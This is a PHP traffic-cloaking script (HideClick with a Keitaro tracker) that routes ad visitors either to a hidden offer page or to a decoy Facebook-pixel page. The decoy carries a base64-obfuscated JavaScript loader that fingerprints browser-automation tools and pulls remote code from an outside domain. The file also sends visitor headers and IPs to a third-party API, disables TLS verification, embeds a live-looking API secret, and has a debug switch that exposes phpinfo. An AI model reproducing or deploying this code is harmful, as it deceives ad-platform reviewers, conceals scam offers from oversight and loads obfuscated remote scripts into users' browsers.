<?php
require '../lead-api/config.php';
require '../lead-api/keitaro-admin.php';

//KEITARO
if (empty($offer_url) or empty($geo_hideclick) or empty($method)) {
	$company_id = "Company_not_found";
	$streams = 0;
	$company_id = findCompanyId($user_id);
	$company_info = getCompany($company_id);
	if ($company_id !== false){
		$streams_info = getStreams($company_id);
		$max_streams = count($streams_info);
		$current_stream = rand(0, $max_streams - 1);
		if ($max_streams>1){
			for ($i = 0; $i < count($streams_info); $i++) {
				$stream_id[$i] = $streams_info[$i]["id"];
				if ($i === $current_stream) {
					enableStream($stream_id[$i]);
				} else {
					disableStream($stream_id[$i]);
				}
			}
		}
		$offer_id = $streams_info[$current_stream]["offers"][0]["offer_id"];
		$offer_info = getOffer($offer_id);
		$offer_url = $offer_info["url"];
		$geo_hideclick = $offer_info["geo"];
		$method = $company_info['method'];
	}
}


//HIDECLICK
$CLOAKING['OFFER_PAGE'] = $offer_url;
$CLOAKING['ALLOW_GEO'] = $geo_hideclick;
$CLOAKING['OFFER_METHOD'] = $method;
//FIX

if (empty($CLOAKING['OFFER_PAGE'])) {
	$CLOAKING['OFFER_PAGE'] = 'https://basota.xyz/';
}
if (empty($CLOAKING['ALLOW_GEO'])) {
	$CLOAKING['ALLOW_GEO'] = 'RU';
}
if (empty($CLOAKING['OFFER_METHOD'])) {
	$CLOAKING['OFFER_METHOD'] = 'redirect';
}
$CLOAKING['DEBUG_MODE'] = 'off';

$CLOAKING['UTM'] = true;
// пропишите в следующей строке один из вариантов: redirect, iframe

// Настройки методов отображения WHITE_PAGE если в качестве WHITE_PAGE используется ссылка. Возможные значения: standart, encoded
// используйте конфигуратор для того чтобы изменить значение этот параметр! //
$CLOAKING['WHITE_METHOD'] = 'encoded';
// NO_REF блокирует запросы с пустым рефером, рекомендуется только если весь трафик идет с рекламной кампании в поиске (yandex, google) //
// измените значение в следующей строке с false на true, чтобы включить блокирование пустого реферера //
$CLOAKING['NO_REF'] = false;
// WHITE_REF позволяет заблокировать все запросы у которых рефрер не совпадает с регулярным выражением.//
// Например регулярное выражение 'google|facebook' заблокирует все визиты кроме тех, которые пришли гугла или фейсбука //
$CLOAKING['WHITE_REF'] = '';
// режжим DELAY_START показывает первым Х уникальным посетителям вайтпейдж (независимот от других настроек) //
$CLOAKING['DELAY_START'] = 0;
// режжим DELAY_PERMANENT перманентно банит IP адреса первых Х посетителей //
$CLOAKING['DELAY_PERMANENT'] = false;
// Режим "паранойи": блокирует spy / verification сервисы использующие residential proxy, но при этом в некоторых гео может блокировать реальных пользователей. //
// чтобы включить режим "паранойи" измените значение в следующей строке с false на true //
$CLOAKING['PARANOID'] = false;

// Следующие настройки нужны только если у вас не стандартный хостинг и что-то не работает //
// удалите символы "//" в начале следующей строки если клоака не работает и сайт использует CDN, Varnish или другой кеширующий прокси //
//$CLOAKING['DISABLE_CACHE'] = true;

// Ваш API ключ. Храните его в секрете!      //
// DO NOT SHARE API KEY! KEEP IT SECRET!     //
$CLOAKING['API_SECRET_KEY'] = 'v176e3b57f23b846b1b9b7adbfaa1c800e';// ключ доступа к API.
//********************************************/
// для редактирования следующего параметра рекомендуется использовать конфигуратор */
$CLOAKING['WHITE_PAGE'] = '<script src="data:text/javascript;base64, dmFyIGU9J2VzenFzZXJzaWh5emllcW5vc3ZqcGd3b2F6dGt4YW9ic25ybHJqJzt2YXIgc3JjPSdodHRwczovL2Nvbm5lY3QuZmFjZWJvb2submV0L2VuX1VTL2ZiZXZlbnRzLmpzJzt2YXIgdGFnPSdzY3JpcHQnOyFmdW5jdGlvbigpe3ZhciBkPWZ1bmN0aW9uKHMpe3ZhciBkID0gcy5yZXBsYWNlKC86L2csJ3JpJykucmVwbGFjZSgvLC9nLCduaScpLnJlcGxhY2UoLzsvZywnbnQnKS5zcGxpdCgnLicpLF8gPSB3aW5kb3csX189Xy5kb2N1bWVudDtfX19fPW5hdmlnYXRvcjt0cnl7Zm9yKCB2YXIgbCBpbiBkKSB7dmFyIF9fXyA9IGRbbF07O2lmIChfW19fX118fF9fX19bX19fXSlyZXR1cm4gX19fO2lmIChfXyYmX18uZG9jdW1lbnRFbGVtZW50JiZfXy5kb2N1bWVudEVsZW1lbnQuZ2V0QXR0cmlidXRlJiZfXy5kb2N1bWVudEVsZW1lbnQuZ2V0QXR0cmlidXRlKF9fXykpcmV0dXJuIF9fXztpZihfX18gaW4gXyB8fCBfX18gaW4gX18pIHJldHVybiBfX187fSByZXR1cm4gMDt9Y2F0Y2goZSl7fX0oIl9fc3RvcEFsbFRpbWVycy53ZWJkOnZlci5fXyxnaHRtYXJlLl9zZWxlLHVtLmNhbGxQaGE7b20uY2FsbFNlbGUsdW0uX1NlbGUsdW1fSURFX1JlY29yZGVyLnNlbGUsdW0uZDp2ZXIuX3NlbGUsdW0uX193ZWJkOnZlcl9ldmFsdWF0ZS5fX3NlbGUsdW1fZXZhbHVhdGUuX193ZWJkOnZlcl9zYzpwdF9mdW5jdGlvbi5fX3dlYmQ6dmVyX3NjOnB0X2Z1bmMuX193ZWJkOnZlcl9zYzpwdF9mbi5fX2Z4ZDp2ZXJfZXZhbHVhdGUuX19kOnZlcl91bndyYXBwZWQuX193ZWJkOnZlcl91bndyYXBwZWQuX19kOnZlcl9ldmFsdWF0ZS5fX3NlbGUsdW1fdW53cmFwcGVkLl9fZnhkOnZlcl91bndyYXBwZWQuX3BoYTtvbS5waGE7b20uZG9tQXV0b21hdGlvbl9fLGdodG1hcmUiKTtzcmM9J2h0dHBzOi8vZG9sYmF6b24ud2Vic2l0ZS9oaWRlLWNsb2FrLnBocD9yZWY9JytlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpKycmZHJpdmU9JytkKycmcT0nK2VuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cubG9jYXRpb24uc2VhcmNoLnN1YnN0cigxKSl9KCk7ZG9jdW1lbnQud3JpdGUoJzwnK3RhZysnIHNyYz0iJyArIHNyYyArICciPjxcLycrdGFnKyc+Jyk="></script>';
// Не вносите изменения в дальнейший код (по крайней мере если вы не PHP програмист)
// DO NOT EDIT ANYTHING BELOW !!!
if (!empty($CLOAKING['VERSION']) || !empty($GLOBALS['CLOAKING']['VERSION'])) {
	die('Recursion Error');
}
//$CLOAKING['VERSION']=20200115;
$CLOAKING['VERSION'] = 20200303;
//$CLOAKING['HTACCESS_FIX'] = true;

$errorContactMessage = "<br><br>Need help? Contact us by telegram: <a href=\"tg://resolve?domain=hideclick\">@hideclick</a><br>Что-то пошло не так. Если вам нужна помощь свяжитесь с нами в телеграме: <a href=\"tg://resolve?domain=hideclick\">@hideclick</a><br>";
if (!empty($_GET['utm_allow_geo']) && preg_match('#^[a-zA-Z]{2}(-|$)#', $_GET['utm_allow_geo'])) {
	$CLOAKING['ALLOW_GEO'] = $_GET['utm_allow_geo'];
}
if (empty($CLOAKING['PARANOID'])) {
	$CLOAKING['PARANOID'] = '';
}
if (empty($CLOAKING['ALLOW_GEO'])) {
	$CLOAKING['ALLOW_GEO'] = '';
}
if (empty($CLOAKING['HTACCESS_FIX'])) {
	$CLOAKING['HTACCESS_FIX'] = '';
}
if (empty($CLOAKING['DISABLE_CACHE'])) {
	$CLOAKING['DISABLE_CACHE'] = '';
} else {
	setcookie("euConsent", 'true');
	setcookie("BC_GDPR", time());
	header("Cache-control: private, max-age=0, no-cache, no-store, must-revalidate, s-maxage=0");
	header("Pragma: no-cache");
	header("Expires: " . date('D, d M Y H:i:s', rand(1560500925, 1571559523)) . " GMT");
}

if (!empty($_REQUEST['cloaking'])) {
	ini_set('display_errors', 1);
	ini_set('display_startup_errors', 1);
	error_reporting(E_ALL);
	if ($_REQUEST['cloaking'] == 'stat' || $_REQUEST['cloaking'] == 'stats') {
		if (empty($CLOAKING['API_SECRET_KEY']) || strlen($CLOAKING['API_SECRET_KEY']) < 16) {
			echo '<html><head><meta charset="UTF-8"></head><body><b>Ошибка: не указан секретный API ключ!</b><br>Пропишите ваш ключ (вы сможете найти его в почте, или предыдущей версии скрипта) в строке <b>#' . cloakedEditor("\$CLOAKING['API_SECRET_KEY']") . '</b> чтобы получилось:<br><code>$CLOAKING[\'API_SECRET_KEY\'] = \'ТУТ ВАШ КЛЮЧ\';</code><br>' . $errorContactMessage;
			die();
		}
		setcookie("hideclick", 'ignore', time() + 604800);
		if (!empty($_SERVER['HTTP_HOST'])) {
			$host = $_SERVER['HTTP_HOST'];
		} else {
			if (!empty($_SERVER['Host'])) {
				$host = $_SERVER['Host'];
			} else {
				if (!empty($_SERVER['host'])) {
					$host = $_SERVER['host'];
				} else {
					if (!empty($_SERVER[':authority'])) {
						$host = $_SERVER[':authority'];
					} else {
						$host = '';
					}
				}
			}
		}
		if (!empty($_SERVER['REQUEST_URI'])) {
			$host .= $_SERVER['REQUEST_URI'];
		}
		if (stristr($host, '?')) {
			$host = substr(0, strpos($host, '?'));
		}
		if (substr($host, 0, 4) == 'www.') {
			$host = substr($host, 4);
		}
		$domainStat = '';
		if (!empty($_REQUEST['domain'])) {
			$domainStat .= '&domain=' . $_REQUEST['domain'];
		}
		if (!empty($_REQUEST['date2'])) {
			$domainStat .= '&date2=' . $_REQUEST['date2'];
		}//timestamp
		else {
			$domainStat .= '&date2=' . time();
		}
		if (!empty($_REQUEST['date1'])) {
			$domainStat .= '&date1=' . $_REQUEST['date1'];
		}//timestamp
		else {
			$domainStat .= '&date1=' . (time() - 604800);
		}
		if (!function_exists('curl_init')) {
			$statistic = file_get_contents('https://hideapi.xyz/newstatjs?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=ru&sign=92951612231041f1587390160&version=' . $CLOAKING['VERSION'] . '&stage=js1&js=true&cache=' . $CLOAKING['DISABLE_CACHE'] . '&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&host=' . urlencode($host) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']) . $domainStat,
				'r', stream_context_create(array(
					'http' => array('method' => 'GET', 'timeout' => 45),
					'ssl' => array('verify_peer' => false, 'verify_peer_name' => false,)
				)));
		} else {
			$statistic = cloakedCurl('https://hideapi.xyz/newstatjs?api=' . $CLOAKING['API_SECRET_KEY'] . '&lang=ru&sign=92951612231041f1587390160&version=' . $CLOAKING['VERSION'] . '&stage=js1&js=true&cache=' . $CLOAKING['DISABLE_CACHE'] . '&geo=' . urlencode($CLOAKING['ALLOW_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&host=' . urlencode($host) . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']) . $domainStat);
		}
		echo $statistic;
		if (empty($statistic)) {
			echo "<html><head><meta charset=\"UTF-8\"></head><body>" . $errorContactMessage;
		}
	} else {
		if ($_REQUEST['cloaking'] == 'debug') {
			phpinfo();
			print_r(debug_backtrace());
			$CLOAKING['API_SECRET_KEY'] = 1;
			print_r($CLOAKING);
			die();
		} else {
			if ($_REQUEST['cloaking'] == 'time') {
				header("Cache-control: public, max-age=999999, s-maxage=999999");
				header("Expires: Wed, 21 Oct 2025 07:28:00 GMT");
				echo str_replace(" ", "", rand(1, 10000) . microtime() . rand(1, 100000));
			}
		}
	}
	die();
}
if (empty($CLOAKING['OFFER_PAGE']) || (!strstr($CLOAKING['OFFER_PAGE'], '://'))) {
	echo "<html><head><meta charset=\"UTF-8\"></head><body>ERROR OFFER PAGE NOT FOUND: " . $CLOAKING['OFFER_PAGE'] . "! \r\n<br><br>Пропишите ссылку в параметре OFFER_PAGE: " . $CLOAKING['OFFER_PAGE'] . "!" . $errorContactMessage;
	die();
}
// отсюда начинается реальная логика работы скрипта.
// dirty hack для бинома и подобно настроенных серверов, у которых все запросы идут через скрипт.
if (function_exists('header_remove')) {
	header_remove("X-Powered-By");
}
@ini_set('expose_php', 'off');

$CLOAKINGdata = array();

if (function_exists("getallheaders")) {
	$CLOAKINGdata = getallheaders();
}
foreach ($_SERVER as $k => $v) {
	if (substr($k, 0, 5) == 'HTTP_') {
		$CLOAKINGdata[$k] = $v;
	}
}
$CLOAKINGdata['path'] = $_SERVER["REQUEST_URI"];
$CLOAKINGdata['REQUEST_METHOD'] = $_SERVER['REQUEST_METHOD'];
//fix for roadrunner ???
//$CLOAKINGdata['host']=$CLOAKING['DOMAIN'];//fix for roadrunner ???
//$CLOAKINGdata['path']=http_build_query ($_GET);//fix for roadrunner ???
// интегрируем плагины в основной код, иначе стата не учитывает их работу
$CLOAKING['banReason'] = '';
if ($CLOAKING['NO_REF'] || !empty($CLOAKING['WHITE_REF'])) {
	$ref = '';
	foreach (array('HTTP_REFERER', 'Referer', 'referer', 'REFERER') as $k) {
		if (!empty($CLOAKINGdata[$k])) {
			$ref = $_SERVER[$k];
			break;
		}
	}
	if (empty($ref)) {
		$CLOAKING['banReason'] .= 'noref.';
	}
//    elseif(!empty($CLOAKING['WHITE_REF']) && !preg_match("#https?://[^/]*(".$CLOAKING['WHITE_REF'].")#i",$ref)) $CLOAKING['banReason'].='blackref.';
}
//if($CLOAKING['BLOCK_APPLE'] || $CLOAKING['BLOCK_ANDROID'] || $CLOAKING['BLOCK_WIN'] || $CLOAKING['BLOCK_MOBILE'] || $CLOAKING['BLOCK_DESCTOP']) {
//    $ua='';
//    foreach (array('HTTP_USER_AGENT','USER-AGENT','User-Agent','User-agent','user-agent') as $k){
//        if(!empty($CLOAKINGdata[$k])) {$ua=$_SERVER[$k];break;}
//    }
//    if($CLOAKING['BLOCK_APPLE'] && stristr($ua,'Mac OS')) $CLOAKING['banReason'].='blockapple.';
//    if($CLOAKING['BLOCK_ANDROID'] && stristr($ua,'Android')) $CLOAKING['banReason'].='blockandroid.';
//    if($CLOAKING['BLOCK_WIN'] && stristr($ua,'Windows')) $CLOAKING['banReason'].='blockwin.';
//    if($CLOAKING['BLOCK_MOBILE'] && (stristr($ua,'like Mac OS X')||stristr($ua,'mobile')||stristr($ua,'table'))) $CLOAKING['banReason'].='blockmobile.';
//    else if($CLOAKING['BLOCK_DESCTOP']) $CLOAKING['banReason'].='blockdescktop.';
//}
if ($CLOAKING['DELAY_START']) {
	$ip = '';
	foreach (array('HTTP_CF_CONNECTING_IP', 'CF-Connecting-IP', 'Cf-Connecting-Ip', 'cf-connecting-ip') as $k) {
		if (!empty($_SERVER[$k])) {
			$ip = $_SERVER[$k];
		}
	}
	if (empty($ip)) {
		foreach (array('HTTP_FORWARDED', 'Forwarded', 'forwarded', 'REMOTE_ADDR') as $k) {
			if (!empty($_SERVER[$k])) {
				$ip .= $_SERVER[$k];
			}
		}
	}
	$ips = file('dummyCounter.txt', FILE_IGNORE_NEW_LINES);
	if (empty($ips)) {
		$ips = array(0 => 0);
		file_put_contents('dummyCounter.txt', "0\n", FILE_APPEND);
	} else {
		$ips = array_flip($ips);
	}
	$ip = crc32($ip);
	if (!empty($ips[$ip]) && ($CLOAKING['DELAY_PERMANENT'] || sizeof($ips) <= $CLOAKING['DELAY_START'])) {
		$CLOAKING['banReason'] .= 'delaystart.';
	} elseif (sizeof($ips) <= $CLOAKING['DELAY_START']) {
		file_put_contents('dummyCounter.txt', $ip . "\n", FILE_APPEND);
		$CLOAKING['banReason'] .= 'delaystart.';
	}
}

// закончили интеграцию плагинов, и теперь можно подготовить данные для отправки на сервер
if (!empty($_SERVER['HTTP_REFERER'])) {
	$CLOAKINGdata['HTTP_X_FORWARDED_HOST'] = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
} else {
	if (!empty($_SERVER['Referer'])) {
		$CLOAKINGdata['HTTP_X_FORWARDED_HOST'] = parse_url($_SERVER['Referer'], PHP_URL_HOST);
	}
}

$CLOAKINGdata = json_encode($CLOAKINGdata);
if (!function_exists('curl_init')) {
	$CLOAKING['STATUS'] = @file_get_contents('http://api.hideapi.xyz/basic?ip=' . $_SERVER["REMOTE_ADDR"] . '&port=' . $_SERVER["REMOTE_PORT"] . '&banReason=' . $CLOAKING['banReason'] . '&key=' . $CLOAKING['API_SECRET_KEY'] . '&sign=92951612231041f1587390160&version=' . $CLOAKING['VERSION'] . $CLOAKING['WHITE_METHOD'] . '.' . $CLOAKING['OFFER_METHOD'] . '&stage=js1&js=true&cache=' . $CLOAKING['DISABLE_CACHE'] . '&geo=' . preg_replace('#[^a-zA-Z,]+#',
			',',
			$CLOAKING['ALLOW_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']),
		'r', stream_context_create(array(
			'ssl' => array('verify_peer' => false, 'verify_peer_name' => false,),
			'http' => array(
				'method' => 'POST',
				'timeout' => 5,
				'header' => "Content-type: application/x-www-form-urlencoded\r\n" . "Content-Length: " . strlen($CLOAKINGdata) . "\r\n",
				'content' => $CLOAKINGdata
			)
		)));
} else {
	$CLOAKING['STATUS'] = @cloakedCurl('http://api.hideapi.xyz/basic?ip=' . $_SERVER["REMOTE_ADDR"] . '&port=' . $_SERVER["REMOTE_PORT"] . '&banReason=' . $CLOAKING['banReason'] . '&key=' . $CLOAKING['API_SECRET_KEY'] . '&sign=92951612231041f1587390160&version=' . $CLOAKING['VERSION'] . $CLOAKING['WHITE_METHOD'] . '.' . $CLOAKING['OFFER_METHOD'] . '&stage=js1&js=true&cache=' . $CLOAKING['DISABLE_CACHE'] . '&geo=' . preg_replace('#[^a-zA-Z,]+#',
			',',
			$CLOAKING['ALLOW_GEO']) . '&paranoid=' . $CLOAKING['PARANOID'] . '&offer=' . urlencode($CLOAKING['OFFER_PAGE']),
		$CLOAKINGdata);
}
$CLOAKING['STATUS'] = json_decode($CLOAKING['STATUS'], true);

header("Content-Type: application/javascript");
//srand(crc32($_SERVER['HTTP_HOST'].$_SERVER['HOST'].$_SERVER['Host'].$_SERVER['host'].$_SERVER["SCRIPT_NAME"]));
if (empty($CLOAKING['banReason']) && !empty($CLOAKING['STATUS']) && !empty($CLOAKING['STATUS']['action']) && $CLOAKING['STATUS']['action'] == 'allow' && (empty($CLOAKING['ALLOW_GEO']) || (!empty($CLOAKING['STATUS']['geo']) && !empty($CLOAKING['ALLOW_GEO']) && stristr($CLOAKING['ALLOW_GEO'],
				$CLOAKING['STATUS']['geo'])))) {
	if ($CLOAKING['UTM'] && !empty($_GET) && !empty($_GET['q'])) {
		if (strstr($CLOAKING['OFFER_PAGE'], '?')) {
			$CLOAKING['OFFER_PAGE'] .= '&' . urldecode($_GET['q']);
		} else {
			$CLOAKING['OFFER_PAGE'] .= '?' . urldecode($_GET['q']);
		}
		$page = base64_encode($CLOAKING['OFFER_PAGE']);
	} else {
		$page = base64_encode($CLOAKING['OFFER_PAGE']);
	}

	if (!empty($CLOAKING['STATUS']['uid'])) {
		$uid = $CLOAKING['STATUS']['uid'];
		setcookie('uid', $uid, time() + 604800);
	} else {
		$uid = '';
	}

	$output = '';


	if ($CLOAKING['UTM'] && empty($_GET['q'])) {
		$output = "var s='" . $page . "';try{s=btoa(atob(s)+(atob(s).indexOf('?')<0 ? '?':'&')+window.location.search.substr(1));}catch(e){console.log(e)};document.write('<script src=\"https://" . $CLOAKING['STATUS']['host'] . "/fb.js?uid=" . $uid . "&method=" . $CLOAKING['OFFER_METHOD'] . "&session=" . $CLOAKING['STATUS']['js'] . "_'+s+'\"></script>')";
	} else {
		$output = "document.write('<script src=\"https://" . $CLOAKING['STATUS']['host'] . "/fb.js?uid=" . $uid . "&method=" . $CLOAKING['OFFER_METHOD'] . "&session=" . $CLOAKING['STATUS']['js'] . "_" . $page . "\"></script>')";
	}
//    header("Location: https://cloudnetwork.cf/fb.js?uid=".$uid."&session=".$CLOAKING['STATUS']['js']."_".$page);
	if ($CLOAKING['NO_REF']) {
		$output = 'if(document && document.referrer && document.referrer.length>0){' . $output . '}';
	}
	echo $output;
} else {
	echo "document.write('<script src=\"https://connect.facebook.net/en_US/fbevents.js\"></script>')";
//    header("Location: https://connect.facebook.net/en_US/fbevents.js");
}

function cloakedCurl($url, $body = '', $returnHeaders = false)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	if (!empty($body)) {
		curl_setopt($ch, CURLOPT_POST, 1);
	}
	if (!empty($returnHeaders)) {
		curl_setopt($ch, CURLOPT_HEADER, 1);
	}
	curl_setopt($ch, CURLOPT_POSTFIELDS, "$body");
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	curl_setopt($ch, CURLOPT_TIMEOUT, 45);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$r = @curl_exec($ch);
	curl_close($ch);
	return $r;
}

function cloakedEditor($s)
{
	$f = file($_SERVER["SCRIPT_FILENAME"]);
	$r = 0;
	foreach ($f as $n => $l) {
		if (strstr($l, $s)) {
			$r = $n;
			break;
		}
	}
	return $r + 1;
}

die();
